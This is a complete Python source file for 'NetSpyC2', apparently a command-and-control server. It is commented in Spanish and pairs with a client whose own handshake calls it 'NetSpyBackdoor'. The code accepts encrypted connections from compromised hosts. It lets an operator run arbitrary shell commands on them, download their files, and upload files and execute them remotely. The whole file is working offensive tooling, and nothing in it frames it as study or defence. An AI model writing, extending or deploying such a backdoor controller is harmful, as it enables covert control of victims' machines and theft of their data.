#!/usr/bin/env python3
# NetSpyC2 Server

import socket
import threading
import os
import struct
import time
import logging
import hashlib
import subprocess
import readline
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from colores import *

# Configuración del logging sin códigos de color para el archivo de log.
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("NetSpyC2Server.log"),
        logging.StreamHandler()
    ]
)

HOST = '0.0.0.0'
PORT = 4444
server_socket = None
connections = {}  # {id_conexion: (socket, dirección, aes_key)}
conn_lock = threading.Lock()
conn_id_counter = 0

COMMANDS = [
    "help", "info", "list", "select", "set port", "set host", "exit", "banner"
]

def completer(text, state):
    options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

readline.parse_and_bind("tab: complete")
readline.set_completer(completer)
readline.set_history_length(1000)

def NetSpybanner():
    """Muestra la cabecera de NetSpy."""
    try:
        import banner
        banner.main()
    except ImportError:
        print(f"{B_BLUE}{BOLD}Bienvenido a NetSpy.{RESET}")
    except Exception as e:
        logging.exception("Error mostrando banner: %s", e)

def generate_rsa_keys():
    """Genera un par de claves RSA y retorna (clave_privada, clave_privada_PEM, clave_publica_PEM)"""
    try:
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()

        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        logging.info("RSA generado exitosamente.")
        return private_key, private_pem, public_pem
    except Exception as e:
        logging.exception("Error generando claves RSA: %s", e)
        raise

def mostrar_claves_rsa(private_pem, public_pem):
    """Imprime las claves RSA ya generadas"""
    print("\n----- CLAVE PRIVADA -----")
    print(private_pem.decode())
    print("----- CLAVE PÚBLICA -----")
    print(public_pem.decode())

try:
    SERVER_PRIVATE_KEY, SERVER_PRIVATE_PEM, SERVER_PUBLIC_PEM = generate_rsa_keys()
except Exception:
    logging.critical("No se pudo generar el par de claves RSA. Terminando ejecución.")
    exit(1)

def recvall(sock, n):
    """Recibe exactamente n bytes del socket."""
    data = b''
    try:
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet:
                logging.warning("Socket cerrado durante la recepción de datos.")
                return None
            data += packet
    except Exception as e:
        logging.exception("Error en recvall: %s", e)
        return None
    return data

def send_encrypted_message(sock, plaintext, aes_key):
    """Envía un mensaje cifrado con AESGCM."""
    try:
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, plaintext.encode(), None)
        message = nonce + ciphertext
        # Se envía la longitud del mensaje seguido de los datos
        sock.sendall(struct.pack('!I', len(message)) + message)
    except Exception as e:
        logging.exception("Error enviando mensaje cifrado: %s", e)

def receive_encrypted_message(sock, aes_key):
    """Recibe y descifra un mensaje cifrado con AESGCM."""
    try:
        raw_len = recvall(sock, 4)
        if raw_len is None:
            return None
        msg_len = struct.unpack('!I', raw_len)[0]
        data = recvall(sock, msg_len)
        if data is None:
            return None
        nonce = data[:12]
        ciphertext = data[12:]
        aesgcm = AESGCM(aes_key)
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return plaintext.decode()
    except Exception as e:
        logging.exception("Error recibiendo mensaje cifrado: %s", e)
        return None

def accept_connections(server):
    """Acepta conexiones entrantes y establece el pre-handshake y sesión cifrada."""
    global conn_id_counter
    while True:
        try:
            client_socket, address = server.accept()
            # No ponemos timeout; socket en modo bloqueante
            client_socket.settimeout(None)
            logging.info("Nueva conexión desde %s:%s", address[0], address[1])

            # 1) PRE-HANDSHAKE: El servidor envía un mensaje de bienvenida.
            try:
                client_socket.sendall(b"NetSpy Server v1.0|TCP|(AES-GCM)|TLS|Online\n")
            except Exception as e:
                logging.exception("Error enviando saludo al cliente %s: %s", address, e)
                client_socket.close()
                continue

            # 2) Esperar la respuesta del cliente (handshake)
            try:
                handshake = client_socket.recv(1024)
                if not handshake:
                    logging.warning("No se recibió handshake de %s. Cerrando.", address)
                    client_socket.close()
                    continue
                # Imprimir lo que envía el cliente en texto plano
                print(f"[>] Recibido handshake desde {address}: {handshake!r}")
                decoded = handshake.decode(errors='ignore').strip()
                if decoded != "NetSpyBackdoor v1.0|(AES-GCM)|TLS":
                    logging.warning("Handshake inválido (%s) de %s. Cerrando conexión.", decoded, address)
                    try:
                        client_socket.sendall(b"ERR Invalid handshake\n")
                    except:
                        pass
                    client_socket.close()
                    continue
            except Exception as e:
                logging.exception("Error recibiendo handshake de %s: %s", address, e)
                client_socket.close()
                continue

            # 3) Si el handshake es correcto, enviar la clave pública RSA al cliente
            try:
                client_socket.sendall(b"PUBKEY:" + SERVER_PUBLIC_PEM)
            except Exception as e:
                logging.exception("Error enviando clave pública a %s: %s", address, e)
                client_socket.close()
                continue

            # 4) Recibir la clave AES cifrada con RSA
            raw_len = recvall(client_socket, 4)
            if not raw_len:
                logging.error("No se recibió la longitud de la clave AES de %s.", address)
                client_socket.close()
                continue

            key_len = struct.unpack('!I', raw_len)[0]
            encrypted_aes_key = recvall(client_socket, key_len)
            if not encrypted_aes_key:
                logging.error("No se recibió la clave AES cifrada completa de %s.", address)
                client_socket.close()
                continue

            try:
                aes_key = SERVER_PRIVATE_KEY.decrypt(
                    encrypted_aes_key,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
            except Exception as e:
                logging.exception("Error desencriptando la clave AES de %s: %s", address, e)
                client_socket.close()
                continue

            with conn_lock:
                connections[conn_id_counter] = (client_socket, address, aes_key)
                logging.info("Sesión #%s establecida con %s:%s", conn_id_counter, address[0], address[1])
                conn_id_counter += 1

        except Exception as e:
            logging.exception("Error al aceptar conexión: %s", e)

def receive_file(client_socket, aes_key, file_name):
    """
    Recibe un archivo enviado por el cliente.
    Se espera un encabezado "SIZE <size> <hash>" cifrado y luego los datos cifrados chunked.
    """
    try:
        header = receive_encrypted_message(client_socket, aes_key)
        if not header or not header.startswith("SIZE "):
            return f"{ALERT} {RED}[ ERROR ] Encabezado incorrecto.{RESET}"

        _, sz, expected_hash = header.split()
        file_size = int(sz)
        logging.info("Recibiendo '%s' de %d bytes. Hash esperado: %s",
                     file_name, file_size, expected_hash)

        received = 0
        sha = hashlib.sha256()
        with open(file_name, 'wb') as f:
            while received < file_size:
                raw_len = recvall(client_socket, 4)
                if not raw_len:
                    raise IOError("EOF inesperado al leer longitud de chunk")
                packet_len = struct.unpack('!I', raw_len)[0]
                packet = recvall(client_socket, packet_len)
                if not packet:
                    raise IOError("EOF inesperado al leer chunk")
                nonce = packet[:12]
                ct = packet[12:]
                aesgcm = AESGCM(aes_key)
                chunk = aesgcm.decrypt(nonce, ct, None)
                f.write(chunk)
                sha.update(chunk)
                received += len(chunk)

        actual_hash = sha.hexdigest()
        if received != file_size:
            return f"{ALERT} {RED}[ ERROR ] Bytes esperados {file_size}, recibidos {received}.{RESET}"
        if actual_hash != expected_hash:
            return f"{ALERT} {RED}[ ERROR ] Hash incorrecto: {actual_hash}{RESET}"

        msg = f"{B_GREEN}[ SUCCESS ] Archivo '{file_name}' recibido correctamente.{RESET}"
        send_encrypted_message(client_socket, msg, aes_key)
        logging.info(msg)
        return msg

    except Exception as e:
        logging.exception("Error al recibir archivo: %s", e)
        return f"{ALERT} {RED}Error al recibir archivo: {e}{RESET}"

# Tamaño de chunk en bytes
CHUNK_SIZE = 64 * 1024  # 64 KB

def send_file_to_client(sock, aes_key, file_name):
    """
    Envía un archivo al cliente de forma cifrada (chunked AES-GCM).
    Header cifrado + múltiples mensajes chunked (cada uno: [len][nonce|ciphertext]).
    """
    try:
        if not os.path.isfile(file_name):
            send_encrypted_message(sock, f"{ALERT} [-] Archivo no encontrado en el servidor.", aes_key)
            return

        # Calcula tamaño y hash completo
        file_size = os.path.getsize(file_name)
        sha = hashlib.sha256()
        with open(file_name, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()

        # Enviar header cifrado
        header = f"SIZE {file_size} {file_hash}"
        send_encrypted_message(sock, header, aes_key)

        # Enviar datos por chunks
        with open(file_name, 'rb') as f:
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, chunk, None)
                packet = nonce + ct
                # primero longitud de packet, luego packet
                sock.sendall(struct.pack('!I', len(packet)))
                sock.sendall(packet)

        logging.info("%s[+] Archivo '%s' enviado correctamente.%s", B_GREEN, file_name, RESET)
    except Exception as e:
        logging.exception("Error al enviar archivo: %s", e)
        send_encrypted_message(sock, f"{ALERT} [-] Error al enviar archivo.", aes_key)

def rebind_server(new_host, new_port):
    """Reconfigura el servidor para escuchar en un nuevo host y/o puerto."""
    global server_socket, HOST, PORT
    try:
        if server_socket:
            try:
                server_socket.close()
            except Exception as e:
                logging.warning("Error cerrando el socket antiguo: %s", e, exc_info=True)
        HOST = new_host
        PORT = new_port
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        logging.info("Servidor rebind a %s:%s", HOST, PORT)
        threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
    except Exception as e:
        logging.exception("Error al rebind del servidor: %s", e)

def interactive_shell():
    """Bucle principal de interacción con el operador."""
    NetSpybanner()
    while True:
        try:
            cmd = input(f"{B_BLUE}{BOLD}NetSpy> {RESET}").strip()
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Usa 'exit' para cerrar el servidor.{RESET}")
            continue
        except EOFError:
            print(f"\n{YELLOW}{BOLD}Saliendo de NetSpy.{RESET}")
            break

        if cmd == "help":
            help_text = f"""
{b_white}{BOLD}NetSpy  - Herramienta de administración remota{RESET}

{b_green}Comandos:{RESET}
  {b_green}help{RESET}{b_white}                   -> Muestra esta ayuda.{RESET}
  {b_green}rsa keys{RESET}{b_white}                -> Imprime el par de claves RSA.{RESET}
  {b_green}info{RESET}{b_white}                    -> Imprime el log completo del servidor.{RESET}
  {b_green}list{RESET}{b_white}                    -> Lista conexiones activas.{RESET}
  {b_green}select <ID>{RESET}{b_white}             -> Interactúa con una sesión de cliente.{RESET}
  {b_green}set port <PUERTO>{RESET}{b_white}       -> Cambia el puerto de escucha.{RESET}
  {b_green}set host <HOST>{RESET}{b_white}         -> Cambia el host de escucha.{RESET}
  {b_red}exit{RESET}{b_red}                        -> Cierra el servidor.{RESET}

Cualquier otro comando se ejecuta localmente en el sistema.
"""
            print(help_text)
        elif cmd == "info":
            try:
                with open("NetSpyC2Server.log", "r") as f:
                    log_content = f.read()
                print(f"{CYAN}{UNDERLINE}---- LOG DEL SERVIDOR ----{RESET}")
                print(log_content)
                print(f"{CYAN}{UNDERLINE}---- FIN DEL LOG ----{RESET}")
            except Exception as e:
                logging.exception("Error al leer el log: %s", e)
                print(f"{ALERT} {RED}Error al leer el log: {e}{RESET}")
        elif cmd == "banner":
            NetSpybanner()
        elif cmd == "list":
            with conn_lock:
                if connections:
                    for cid, (_, addr, _) in connections.items():
                        print(f"{B_GREEN}{cid}{RESET}: {B_BLUE}{addr[0]}{RESET} - [{B_YELLOW}{addr[1]}{RESET}]")
                else:
                    print(f"{YELLOW}No hay conexiones activas.{RESET}")
        elif cmd.startswith("select "):
            parts = cmd.split()
            if len(parts) != 2:
                print(f"{ALERT} {RED}Uso: select <ID>{RESET}")
                continue
            try:
                cid = int(parts[1])
            except ValueError:
                print(f"{ALERT} {RED}ID inválido.{RESET}")
                continue

            with conn_lock:
                if cid not in connections:
                    print(f"{ALERT} {RED}Conexión no encontrada.{RESET}")
                    continue
                client_socket, addr, aes_key = connections[cid]

            print(f"{B_GREEN}Conectado a sesión #{cid} ({addr}). Escribe 'exit' para salir.{RESET}")
            try:
                while True:
                    try:
                        # Enviar GET_CWD y leer respuesta descifrada
                        send_encrypted_message(client_socket, "GET_CWD", aes_key)
                        current_dir = receive_encrypted_message(client_socket, aes_key)
                        if current_dir is None:
                            print(f"{ALERT} {RED}La conexión se ha cerrado.{RESET}")
                            with conn_lock:
                                connections.pop(cid, None)
                            break

                        prompt = f"{B_BLUE}{cid} ({addr[0]}) {MAGENTA}[{current_dir}]{RESET} >> "
                        command = input(prompt).strip()
                        if command == "":
                            continue
                        if command.lower() == "exit":
                            break

                        if command.startswith("get "):
                            file_name = command.split(" ", 1)[1].strip()
                            send_encrypted_message(client_socket, f"GET_FILE {file_name}", aes_key)
                            print(f"{B_GREEN}[+] Iniciando descarga de '{file_name}'...{RESET}")
                            file_received_msg = receive_file(client_socket, aes_key, file_name)
                            print(file_received_msg)
                            continue

                        if command.startswith("put "):
                            parts2 = command.split()
                            file_name = parts2[1] if len(parts2) > 1 else None
                            if not file_name or not os.path.exists(file_name):
                                print(f"{ALERT} {RED}El archivo '{file_name}' no existe en el servidor.{RESET}")
                                continue

                            execute_remotely = "-exc" in parts2
                            cmd_to_send = f"PUT_FILE {file_name}"
                            if execute_remotely:
                                cmd_to_send += " -exc"

                            send_encrypted_message(client_socket, cmd_to_send, aes_key)
                            send_file_to_client(client_socket, aes_key, file_name)
                            # Leer confirmación del cliente
                            response = receive_encrypted_message(client_socket, aes_key)
                            if response:
                                print(response)
                            continue

                        # Enviar comando normal
                        logging.info("Enviando comando al cliente %s: %s", cid, command)
                        send_encrypted_message(client_socket, command, aes_key)
                        response = receive_encrypted_message(client_socket, aes_key)
                        if response is None:
                            print(f"{ALERT} {RED}La conexión se ha cerrado.{RESET}")
                            with conn_lock:
                                connections.pop(cid, None)
                            break
                        print(response)

                    except KeyboardInterrupt:
                        print(f"\n{YELLOW}Usa 'exit' para salir de la sesión.{RESET}")
                        continue
                    except EOFError:
                        print(f"\n{YELLOW}Saliendo de la sesión...{RESET}")
                        break

            except Exception as e:
                logging.exception("Error durante la interacción con la sesión %s: %s", cid, e)
        elif cmd == "rsa keys":
            mostrar_claves_rsa(SERVER_PRIVATE_PEM, SERVER_PUBLIC_PEM)
        elif cmd.startswith("set port "):
            parts2 = cmd.split()
            if len(parts2) != 3:
                print(f"{ALERT} {RED}Uso: set port <PUERTO>{RESET}")
                continue
            try:
                new_port = int(parts2[2])
                rebind_server(HOST, new_port)
            except ValueError:
                print(f"{ALERT} {RED}El puerto debe ser un número entero.{RESET}")
            except Exception as e:
                logging.exception("Error al cambiar el puerto: %s", e)
        elif cmd.startswith("set host "):
            parts2 = cmd.split()
            if len(parts2) != 3:
                print(f"{ALERT} {RED}Uso: set host <HOST>{RESET}")
                continue
            new_host = parts2[2]
            try:
                rebind_server(new_host, PORT)
            except Exception as e:
                logging.exception("Error al cambiar el host: %s", e)
        elif cmd.lower() == "exit":
            print(f"{YELLOW}{BOLD}Saliendo de NetSpy.{RESET}")
            with conn_lock:
                for cid2, (sock2, _, _) in list(connections.items()):
                    try:
                        sock2.close()
                    except Exception as e:
                        logging.exception("Error cerrando conexión %s: %s", cid2, e)
                connections.clear()
            if server_socket:
                try:
                    server_socket.close()
                except Exception as e:
                    logging.exception("Error cerrando socket del servidor: %s", e)
            break
        else:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.stdout:
                    print(f"{B_GREEN}{result.stdout}{RESET}")
                if result.stderr:
                    print(f"{RED}{result.stderr}{RESET}")
            except Exception as e:
                logging.exception("Error al ejecutar el comando: %s", e)
                print(f"{ALERT} {RED}Error al ejecutar el comando: {e}{RESET}")

def main():
    global server_socket
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        logging.info("Servidor escuchando en %s:%s", HOST, PORT)
    except Exception as e:
        logging.critical("Error iniciando el servidor: %s", e, exc_info=True)
        return

    try:
        threading.Thread(target=accept_connections, args=(server_socket,), daemon=True).start()
    except Exception as e:
        logging.critical("Error al iniciar el hilo de conexiones: %s", e, exc_info=True)
        return

    try:
        interactive_shell()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Usa 'exit' para cerrar correctamente el servidor.{RESET}")
    finally:
        with conn_lock:
            for cid2, (sock2, _, _) in list(connections.items()):
                try:
                    sock2.close()
                except Exception as e:
                    logging.exception("Error cerrando conexión %s: %s", cid2, e)
            connections.clear()
        if server_socket:
            try:
                server_socket.close()
            except Exception as e:
                logging.exception("Error cerrando socket del servidor: %s", e)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Interrupción detectada. Cerrando...{RESET}")
    except Exception as e:
        logging.critical("Excepción no capturada en la ejecución principal: %s", e, exc_info=True)